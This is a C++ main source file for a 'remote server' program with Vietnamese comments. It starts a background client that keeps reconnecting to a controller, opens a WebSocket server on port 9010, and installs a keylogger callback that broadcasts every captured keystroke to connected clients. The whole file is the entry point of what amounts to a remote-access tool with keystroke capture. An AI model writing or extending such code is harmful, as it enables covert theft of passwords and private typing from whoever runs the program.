#include <iostream>
#include <boost/asio.hpp>
#include <thread>

#include "utils/SystemUtils.hpp"
#include "core/CommandDispatcher.hpp"
#include "core/RegistryClient.hpp"
#include "core/WebSocketServer.hpp"
#include "modules/KeyManager.hpp"

int main() {
    try {
        SystemUtils::setup_console();
        std::cout << "=== REMOTE SERVER [" << SystemUtils::get_os_name() << "] ===\n";

        // 1. Init Dispatcher
        CommandDispatcher dispatcher;

        // 2. Init Registry Client (Tự động chạy ngầm tìm & kết nối lại)
        RegistryClient registry;
        registry.start_monitoring(9010); 
        // -> Nó sẽ tự tìm server, nếu không thấy thì 5s sau tìm lại.
        // -> Nếu đang kết nối mà rớt mạng, nó tự quay lại tìm server.

        // 3. Start WebSocket Server
        boost::asio::io_context ioc{1};
        WebSocketServer server(ioc, 9010, dispatcher);

        // 4. Config Keylogger
        KeyManager::set_callback([&server](std::string key) {
            nlohmann::json msg = {
                {"module", "KEYBOARD"},
                {"command", "PRESS"},
                {"data", {{"key", key}}}
            };
            server.broadcast(msg.dump());
        });

        std::cout << "[SERVER] WebSocket Listening on port 9010...\n";
        
        // 5. Run Server
        server.run();
        ioc.run();

    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
    }
    return 0;
}